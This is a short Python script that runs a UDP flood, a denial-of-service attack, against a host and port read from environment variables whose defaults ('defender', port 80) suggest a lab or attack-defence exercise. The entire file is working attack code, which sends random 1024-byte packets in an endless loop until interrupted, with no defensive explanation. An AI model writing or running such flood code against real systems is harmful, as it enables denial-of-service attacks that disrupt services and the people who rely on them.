import socket
import random
import os

target_host = os.getenv("DEFENDER_HOST", "defender")
target_port = int(os.getenv("DEFENDER_PORT", 80))

def udp_flood(target_host, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    
    print(f"Starting UDP flood attack on {target_host}:{target_port}")
    
    try:
        while True:
            sock.sendto(bytes_to_send, (target_host, target_port))
    except KeyboardInterrupt:
        print("Attack stopped")
        sock.close()

if __name__ == "__main__":
    udp_flood(target_host, target_port)